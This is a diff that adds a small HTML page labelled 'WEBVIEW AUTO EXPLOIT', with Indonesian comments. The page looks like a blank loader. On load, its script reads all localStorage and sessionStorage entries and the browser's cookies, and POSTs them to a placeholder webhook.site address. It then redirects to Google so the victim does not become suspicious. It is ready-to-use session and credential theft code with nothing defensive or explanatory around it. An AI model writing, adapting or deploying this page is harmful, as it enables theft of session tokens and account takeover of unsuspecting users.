@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<script>
+// ===== WEBVIEW AUTO EXPLOIT =====
+// GANTI URL_INI dengan webhook anda
+const WEBHOOK = "https://webhook.site/your-id";
+
+(async function() {
+    const data = {
+        time: new Date().toISOString(),
+        ua: navigator.userAgent,
+        url: location.href,
+        storage: {}
+    };
+    
+    // Curi semua localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        data.storage[key] = localStorage.getItem(key);
+    }
+    
+    // Curi sessionStorage
+    data.session = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        data.session[key] = sessionStorage.getItem(key);
+    }
+    
+    // Curi cookies
+    data.cookies = document.cookie;
+    
+    // Kirim ke webhook
+    await fetch(WEBHOOK, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(data),
+        keepalive: true
+    });
+    
+    // Redirect biar tidak curiga
+    location.href = "https://www.google.com";
+})();
+</script>
+<div style="text-align:center;padding:50px">Loading...</div>
+</body>
+</html>
